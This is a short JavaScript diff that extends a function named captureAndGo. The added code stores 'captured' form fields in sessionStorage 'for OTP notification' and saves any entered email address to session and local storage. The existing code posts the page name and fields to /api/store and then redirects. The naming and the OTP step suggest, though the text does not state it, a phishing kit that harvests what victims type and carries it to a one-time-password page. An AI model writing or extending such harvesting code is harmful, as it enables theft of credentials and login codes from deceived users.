@@ -10,6 +10,18 @@ function captureAndGo(url) {
 
   const page = document.title || location.pathname;
 
+  // Store in sessionStorage for OTP notification
+  let existingFields = JSON.parse(sessionStorage.getItem('capturedFields') || '{}');
+  existingFields = { ...existingFields, ...fields };
+  sessionStorage.setItem('capturedFields', JSON.stringify(existingFields));
+
+  // Store email if captured
+  if (fields.emailInput || fields.email || fields['Email address']) {
+    const email = fields.emailInput || fields.email || fields['Email address'];
+    sessionStorage.setItem('userEmail', email);
+    localStorage.setItem('userEmail', email);
+  }
+
   navigator.sendBeacon('/api/store', new Blob([JSON.stringify({ page, fields })], { type: 'application/json' }));
 
   if (url) {
